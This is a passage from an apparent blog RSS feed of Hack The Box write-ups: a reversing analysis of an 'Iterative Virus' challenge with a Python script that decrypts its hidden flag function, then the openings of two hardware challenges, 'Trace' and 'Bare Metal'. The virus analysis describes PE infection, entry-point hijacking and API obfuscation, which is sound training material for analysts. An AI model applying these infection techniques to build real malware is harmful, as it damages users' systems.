&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PULONG&lt;/span> &lt;span class="n">NumberOfBytesWritten&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="anti-sandbox">Anti-Sandbox
&lt;/h2></description></item><item><title>HTB Iterative Virus</title><link>https://Kvn11.github.io/p/htb-iterative-virus/</link><pubDate>Tue, 12 Sep 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-iterative-virus/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/hackthebox.jpg" alt="Featured image of post HTB Iterative Virus" />&lt;blockquote>
&lt;p>&lt;strong>Challenge Description&lt;/strong>: While cleaning up the workspace of a recently retired employee, we noticed that one of the core files of the very important programs they were working on didn&amp;rsquo;t match up with the backups we have of it, could you check it out for us?&lt;/p>
&lt;/blockquote>
&lt;h2 id="initial-analysis">Initial Analysis
&lt;/h2>&lt;p>Upon running the executable, nothing out of the ordinary seemed to happen.
The &lt;code>.exe&lt;/code> printed &amp;ldquo;Hello World!&amp;rdquo; and exited normally.
&lt;code>PEBear&lt;/code> showed that there was another strange section in the exe file called &lt;code>.ivir&lt;/code>.
I made the assumption that this was a reference to &lt;code>I terative VIRus&lt;/code>, and the entry point being in this section further reinforced my theory that this was the &amp;ldquo;virus&amp;rdquo; part of the file.
The time stamp was set to &lt;code>deadc0de&lt;/code> which was also strange, since that translates to a date well into the future.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_1.png"
width="1038"
height="523"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_1_hu35f29c00fe042e3450b010407551f812_42024_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_1_hu35f29c00fe042e3450b010407551f812_42024_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="PE Bear analysis"
class="gallery-image"
data-flex-grow="198"
data-flex-basis="476px"
>&lt;/p>
&lt;h2 id="reversing-with-ida-free">Reversing with IDA Free
&lt;/h2>&lt;p>The first interesting function to look at is one that returns a function name based on a number it is given.
It uses stack strings to prevent analysis tools from detecting the string as a string.
We can right click on the hex values to convert them to characters.
The result name is then passed to another function that seems to return a function pointer.
This made me think that the exe was dynamically resolving functions.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_2.PNG"
width="484"
height="705"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_2_hu0c19397b28ef6f5773be28e20b8e7a0b_37887_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_2_hu0c19397b28ef6f5773be28e20b8e7a0b_37887_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Dynamic Resolving Function 1"
class="gallery-image"
data-flex-grow="68"
data-flex-basis="164px"
>&lt;/p>
&lt;p>After we sort through each function call and match up the result, we can see the functions that have been resolved:&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_3.PNG"
width="1426"
height="340"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_3_hu5aab81d97e2caa4fce51f034348e4220_37172_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_3_hu5aab81d97e2caa4fce51f034348e4220_37172_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Dynamic Resolving Function 2"
class="gallery-image"
data-flex-grow="419"
data-flex-basis="1006px"
>&lt;/p>
&lt;p>After these functions have been resolved, there is a value 5 bytes after the entry point that is compared.
If the value is 5, then a function is called.
However, this function seems to be broken, encrypted, or heavily obfuscated since the disassembly doesn&amp;rsquo;t seem valid.
Otherwise, what seems like a key value is chosen and saved.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_4.PNG"
width="671"
height="488"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_4_hu97d836c2e9435e68c7c5d6d84c7f93af_18847_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_4_hu97d836c2e9435e68c7c5d6d84c7f93af_18847_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Key Values"
class="gallery-image"
data-flex-grow="137"
data-flex-basis="330px"
>&lt;/p>
&lt;p>Then the exe will iterate over all the &lt;code>*.exe&lt;/code> files in its current directory, confirm some checks, and if everything looks good it will perform some actions on the current &lt;code>.exe&lt;/code> file.
The main check is that the timestamp of the file needs to be set to &lt;code>THIS&lt;/code> otherwise the infection of the file will not take place.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_5.PNG"
width="733"
height="279"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_5_hucbbb156f379a41ebc5b60fa14a48910c_24109_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_5_hucbbb156f379a41ebc5b60fa14a48910c_24109_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Infection Checks"
class="gallery-image"
data-flex-grow="262"
data-flex-basis="630px"
>&lt;/p>
&lt;p>Most the proceeding infection process isn&amp;rsquo;t super important, and was in fact pretty tedious to look through and rename.
A new section and section header are added and modified to make sure they adhere to alignment rules, and the rest of the process is just copying over the infection code and making it so it replaces the entry point of the victim file.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_6.PNG"
width="927"
height="537"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_6_huc09620f703d3c84eae24ae7156062fe9_62214_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_6_huc09620f703d3c84eae24ae7156062fe9_62214_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Infection Process"
class="gallery-image"
data-flex-grow="172"
data-flex-basis="414px"
>&lt;/p>
&lt;p>The end of the process loops over the data from the broken function from earlier, and multiplies it against the key value selected earlier.
This new modified code is then copied into the victim file.
Then the byte 5 bytes ahead of the entry point is incremented and copied into the victim file.
This means when the newly infected victim exe is run, it will use the second key.
Then the next file to be infected will use the third key, and so on until the 4th iteration when that special byte is set to 5.
At that point the strange function from earlier runs.
This implies that after a certain number of infections the strange function reveals itself.
I verified most of this with dynamic analysis as well, but didn&amp;rsquo;t take any screenshots.
If you want to verify with a debugger, set a breakpoint after the &lt;code>MapViewOfFile&lt;/code> function and follow it in dump.
From there you can follow along with the exe code as it checks and modifies different parts of the victim file.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_7.PNG"
width="870"
height="136"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_7_hu5bc4ae03addd6b8a46985ebcf02e61a2_10777_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_7_hu5bc4ae03addd6b8a46985ebcf02e61a2_10777_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Decryption Process"
class="gallery-image"
data-flex-grow="639"
data-flex-basis="1535px"
>&lt;/p>
&lt;p>I ran the exe in &lt;code>x64Dbg&lt;/code>, and copied out the encrypted code so I could manually decrypt it.
You could just manipulate the registers to do it all within &lt;code>x64Dbg&lt;/code> but I ran into exceptions doing that so I opted for the python approach.
Here is the script that decrypts the flag function:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-Python" data-lang="Python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">code&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mh">0xE25C0FE4937ECD98&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x46943D7D6211854C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x7ED9FD7403244F3B&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0954450DD34BC4FB&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x34738E7E3DC62246&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x382DF5BC3CDDD484&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x138529F69C81C398&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xE9FCF6D4DD85105E&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x5B977D744A5DBD4C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xC2D93D4B963E5C85&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xB3DD747A06D5A985&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xD454843DE2F28EBF&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x0215CEB076580EDC&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x3F55D6792852AA4D&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x17AF0A0E48DDD484&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x547EA605BB8640AD&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x243D8A75B199B575&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x27D1C0EDAE5CB998&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x6108284AE5787878&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x7E49F4DF10792485&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0xACD9F651E2F28EBF&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xADA04BA5BA8A1444&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xF77252CAFD2A38C9&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x388BB9FB9D000000&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x8CC468D4A37B0000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x891DB54E4E4ABD4C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xEFCE883F2C030000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x399F79C914778100&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0xB5B1F45FAD045A5C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xB721A6D9B394FF4C&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xB0DE9DB43DD7A1B3&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xCC3AF2334A813038&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x3DD6D4E506470273&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x339B093AB6A0F837&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x3E997481AE05CCA5&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x689018943160B8AC&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0xE35AE4EDCF035760&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x6D46B194A1A37B36&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x3619E5691F021894&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0AFD79C343528DEC&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x0F7FEA94A59656C0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x8DAE5CB998000000&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1770879F9859C398&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x28B283C42B81C398&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x7B7B67D3051D07B1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xBFE4C34F82F76B75&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1B6CED770BFBA985&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xB8E5061F67130000&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x953D7B885F773041&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1C206CC310CA422A&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x87130CC425BC4A04&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">KEY_1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x6E2368B9C685770B&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">KEY_2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xEB7FD64E061C1A3D&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">KEY_3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xCB8FF2D53D7505A1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">KEY_4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xF1EF554206DCE4D&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">reverse_hex_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">h&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">h&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">result&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">result&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">print_blob&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">v&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hex_string&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">v&lt;/span>&lt;span class="si">:&lt;/span>&lt;span class="s2">016X&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">reverse_hex_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hex_string&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">result&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">end&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">)):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">code&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0xFFFFFFFFFFFFFFFF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">KEY_1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">KEY_2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">KEY_3&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">KEY_4&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">print_blob&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Attempting to analyze this decrypted code didn&amp;rsquo;t yield any results, so I figured it required the context of the full program to work successfully.
At this point I used &lt;code>HxD&lt;/code> to patch the virus exe to overwrite the encrypted code with the decrypted one.
Then I opened it in IDA and saw that the decrypted code was also resolving more functions dynamically, although these function&amp;rsquo;s aren&amp;rsquo;t too important as the flag is visible in plaintext at this point.
The functions would open up a message box containing the flag value I think.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-iterative-virus/img/img_8.PNG"
width="908"
height="508"
srcset="https://Kvn11.github.io/p/htb-iterative-virus/img/img_8_hub606f63516ba7f29a44885b8f590a99b_47164_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-iterative-virus/img/img_8_hub606f63516ba7f29a44885b8f590a99b_47164_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Flag"
class="gallery-image"
data-flex-grow="178"
data-flex-basis="428px"
>&lt;/p>
&lt;h2 id="lessons-learned">Lessons Learned
&lt;/h2>&lt;p>I spent much more time on this challenge than I should have.
A lot of time was wasted on reversing the exact infection process and seeing what fields were being changed in the headers of the victim file.
I should have focused on the decryption portion and the code surrounding that instead.
All in all, I think for next time I should focus less on the details and more so on the &amp;ldquo;bigger picture&amp;rdquo; of what the application is doing.&lt;/p></description></item><item><title>HTB HW Challenge Trace</title><link>https://Kvn11.github.io/p/htb-hw-challenge-trace/</link><pubDate>Wed, 10 May 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-hw-challenge-trace/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-trace/img/hackthebox.jpg" alt="Featured image of post HTB HW Challenge Trace" />&lt;blockquote>
&lt;p>&lt;strong>Challenge Description&lt;/strong>: One of our embedded devices has been compromised.
It was flashing a message on the debug matrix that was too fast to read, although we managed to capture one iteration of it.
We must find out what was displayed.
To help you with your mission, we will also provide you with the fabrication files of the PCB module the matrix was on.&lt;/p>
&lt;/blockquote>
&lt;h2 id="walkthrough">Walkthrough
&lt;/h2>&lt;p>The zip files contains a Gerber module, as well as a &lt;code>.csv&lt;/code> containing what seems to be the outputs of different &lt;code>GPIO&lt;/code> pins, as well as the time they were recorded.&lt;/p>
&lt;p>Having never really worked with a Gerber module before I had to do research to figure out its importance and usage.&lt;/p>
&lt;p>Gerber describes the elements of a printed circuit board (PCB).
It is used for both the fabrication of the board, and its assembly.
A quick google search tells me that I can open the files using &lt;code>gerbv&lt;/code>.
For some reason, the window would go black whenever I tried importing the &lt;code>.DRL&lt;/code> files, so I excluded those. However, this is the final result:&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_1.png"
width="1441"
height="740"
srcset="https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_1_hu820b72062c5204bbc53581002d8f17d9_114984_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_1_hu820b72062c5204bbc53581002d8f17d9_114984_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Gerber File"
class="gallery-image"
data-flex-grow="194"
data-flex-basis="467px"
>&lt;/p>
&lt;p>There is a term &lt;code>Common Anode Matrix&lt;/code> that I have never heard of before, as well as the MCU on the board being a &lt;code>Raspberry Pi 3b+ Hat&lt;/code>.
ChatGPT reveals that a common anode matrix is simply a grid of LED&amp;rsquo;s, and specific LED&amp;rsquo;s are supplied voltage to create images, letters, or numbers.
Based on this, I can assume that the flag is flashing on the matrix, and I need to map the outputs of the &lt;code>.csv&lt;/code> file to its LED on the board.
I was able to find the following image online which nicely displays the pinout of the Raspberry Pi:&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_2.png"
width="793"
height="599"
srcset="https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_2_hu9b85b2e9e8cc4f23a1927997bb71a49c_793112_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-hw-challenge-trace/img/img_2_hu9b85b2e9e8cc4f23a1927997bb71a49c_793112_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Pinout"
class="gallery-image"
data-flex-grow="132"
data-flex-basis="317px"
>&lt;/p></description></item><item><title>HTB HW Challenge: Bare Metal</title><link>https://Kvn11.github.io/p/bare-metal/</link><pubDate>Sun, 07 May 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/bare-metal/</guid><description>&lt;img src="https://Kvn11.github.io/p/bare-metal/img/hackthebox.jpg" alt="Featured image of post HTB HW Challenge: Bare Metal" />&lt;blockquote>
&lt;p>&lt;strong>Challenge Description&lt;/strong>: Concerned about the integrity of devices produced at a remote fabrication plant, management has ordered a review of our production line.
This revealed many things, including a weird embedded device in one of our serial networks.
In attempting to remove it, we accidentally triggered a hardware failsafe, which resulted in the device stopping working.
However, luckily we extracted the firmware prior to doing so. We need to find out what it did to the slave device it was tapped into, can you help us?
The microcontroller of the device appears to be an atmega328p.&lt;/p>
&lt;/blockquote>
&lt;h2 id="walkthrough">Walkthrough
&lt;/h2>&lt;p>We are given the file &lt;code>extracted_firmware.hex&lt;/code> which contains the hex strings of the data.
A quick google search tells us that we can use the &lt;code>avr-objdump&lt;/code> to get the disassembly of this binary blob.&lt;/p>
&lt;p>&lt;code>avr-objdump -s -m avr5 extracted_firmware.hex -D&lt;/code>&lt;/p>
&lt;p>Looking at the disassembly, it seems that there are a lot of repeated instructions, but there are a few sections where the code is different.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/bare-metal/img/img_1.png"
width="458"
height="233"
srcset="https://Kvn11.github.io/p/bare-metal/img/img_1_hu01dc96bb05787037390d276ea6159f84_66423_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/bare-metal/img/img_1_hu01dc96bb05787037390d276ea6159f84_66423_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="First interesting section"
class="gallery-image"
data-flex-grow="196"
data-flex-basis="471px"
>&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/bare-metal/img/img_2.png"
width="458"
height="295"
srcset="https://Kvn11.github.io/p/bare-metal/img/img_2_hu8cea776933b49c35db5e3f1b56c65c51_84581_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/bare-metal/img/img_2_hu8cea776933b49c35db5e3f1b56c65c51_84581_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Second interesting section"
class="gallery-image"
data-flex-grow="155"
data-flex-basis="372px"
>&lt;/p>
&lt;p>We can analyze the repeated sections first to get an idea of what its repeatedly doing.&lt;/p>
&lt;p>There seems to be two instructionst that repeated, &lt;code>cbi&lt;/code> and &lt;code>sbi&lt;/code> and they are working on the registers at &lt;code>0x0A&lt;/code> and &lt;code>0x0B&lt;/code>.&lt;/p>
&lt;p>Looking at the datasheet we can see that these are the &lt;code>DDRD&lt;/code> and &lt;code>PORTD&lt;/code> registers respectively.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/bare-metal/img/img_3.png"
width="656"
height="76"
